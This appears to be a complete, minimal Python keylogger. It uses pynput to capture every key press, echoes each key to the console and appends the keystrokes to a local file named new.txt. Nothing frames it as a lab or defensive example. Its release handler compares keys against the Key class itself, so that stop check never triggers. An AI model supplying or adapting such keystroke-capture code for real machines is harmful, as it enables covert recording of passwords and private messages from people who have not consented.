from pynput.keyboard import Key, Listener

count = 0
keys = [""]

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(format(key)+"Pressed")
    count = 0
    write_file(keys)
    keys = [""]

def write_file(keys):
    f = open("new.txt" , "a")
    for key in keys:
        k = str(key).replace("'","")
        f.write(k)
    f.close()
def on_release(key):
    if key == Key:
        return False
with Listener(on_press,on_release) as listener:
    listener.join()
